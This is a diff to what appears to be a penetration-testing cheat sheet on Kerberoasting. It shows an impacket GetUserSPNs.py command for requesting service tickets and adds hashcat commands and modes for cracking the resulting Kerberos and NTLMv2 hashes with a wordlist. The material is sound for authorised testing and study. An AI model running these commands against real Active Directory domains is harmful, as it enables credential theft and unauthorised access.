@@ -48,6 +48,16 @@ https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
 python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
 ```
 
+## Cracking
+From Kerberoast output, remove * and be replace / with :
+
+Example Kerberoast hashcat syntax:
+
+``` 
+.\hashcat64.exe -w 4 -m 13100 G:\Tools\KHash.txt G:\Tools\rockyou.txt -r G:\Tools\hashcat-5.1.0\rules\dive.rule 
+```
+
+NTLMv2 -m 5600
 
 ## Tools
 https://github.com/Cerbersec/Ares
